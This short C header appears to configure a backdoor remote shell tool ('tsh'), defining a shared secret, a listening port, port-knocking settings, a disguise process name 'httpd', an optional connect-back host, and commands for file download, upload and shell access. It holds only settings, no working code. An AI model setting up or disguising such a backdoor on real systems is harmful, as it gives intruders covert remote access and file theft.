#ifndef _TSH_H
#define _TSH_H

char *secret = "replace with your password";

#define SERVER_PORT 7586

#define KNOCK_PWD "md5_salt"
#define KNOCK_PORT    1234

#define BINARY_NAME	"httpd"

#define EOL "\n"
/*
#define CONNECT_BACK_HOST  "localhost"
#define CONNECT_BACK_DELAY 30
*/
#define GET_FILE 1
#define PUT_FILE 2
#define RUNSHELL 3

#endif /* tsh.h */
